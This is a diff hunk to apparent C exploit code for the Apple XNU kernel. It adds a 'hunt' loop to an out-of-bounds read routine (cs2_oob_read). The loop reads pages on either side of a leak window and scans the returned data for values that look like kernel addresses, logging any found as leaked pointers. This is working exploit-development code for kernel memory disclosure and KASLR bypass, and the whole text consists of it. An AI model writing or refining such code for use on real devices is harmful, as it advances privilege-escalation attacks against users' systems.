@@ -207,6 +207,47 @@ kern_return_t cs2_oob_read(mach_port_t mo, mach_vm_offset_t mo_offset, uint64_t 
                     LOG("oob MISS lane=copy27 q0=%#llx q1=%#llx (full marker, UPL neighbor silent)",
                         q0, q1);
             }
+            /* v3: THE HUNT ON EVERY SUCCESS — the HIT path's hunt never
+                   fired this boot (zero non-hole content); the hole windows
+                   ARE the neighbor hunt's job. Bidirectional +/-6 pages,
+                   tap-capped. */
+                {
+                    static uint64_t g_hunts = 0;
+                    if (g_hunts++ < 48) {
+                        static const off_t hs[13] = { 0x1000, -0x1000, 0x2000, -0x2000, 0x3000, -0x3000, 0x4000, -0x4000, 0x5000, -0x5000, 0x6000, -0x6000, 0x7000 };
+                        for (int hi = 0; hi < 13; hi++) {
+                            memset_pattern8(buffer, &cs2_ctx.random_marker, size);
+                            ssize_t hn = pread(cs2_ctx.read_fd, buffer, size, (off_t)(0x3f00 + offset) + hs[hi]);
+                            if (hn < 8) continue;
+                            uint64_t hu = 0, hk = 0, hz = 0, hf = 0;
+                            static uint64_t hk_seen[4] = {0};
+                            int hk_n = 0;
+                            size_t hnq = (size_t)hn / 8;
+                            for (size_t hqi = 0; hqi < hnq; hqi++) {
+                                uint64_t hq = 0;
+                                memcpy(&hq, buffer + hqi * 8, sizeof(hq));
+                                if (hq == cs2_ctx.random_marker) continue;
+                                if (hq == 0) { hz++; continue; }
+                                hu++;
+                                if (!hf) hf = hq;
+                                if ((hq >> 36) == 0xfffffff0ull || (hq >> 32) == 0xfffffe00ull ||
+                                    hq >= 0xfffffe0000000000ull) {
+                                    hk++;
+                                    if (hk_n < 4) hk_seen[hk_n++] = hq;
+                                }
+                            }
+                            if (hu)
+                                LOG("[oob] HUNT %#llx content=%llu zero=%llu kptr=%llu%s first=%#llx",
+                                    (unsigned long long)((off_t)(0x3f00 + offset) + hs[hi]),
+                                    (unsigned long long)hu, (unsigned long long)hz,
+                                    (unsigned long long)hk, hk ? "  <-- POINTERS" : "  <-- CONTENT",
+                                    (unsigned long long)hf);
+                            for (int ki = 0; ki < hk_n && ki < 4; ki++)
+                                LOG("[oob] HUNT kptr=0x%016llx", (unsigned long long)hk_seen[ki]);
+                            if (hu > 0) break;
+                        }
+                    }
+                }
             usleep(1);
         }
 
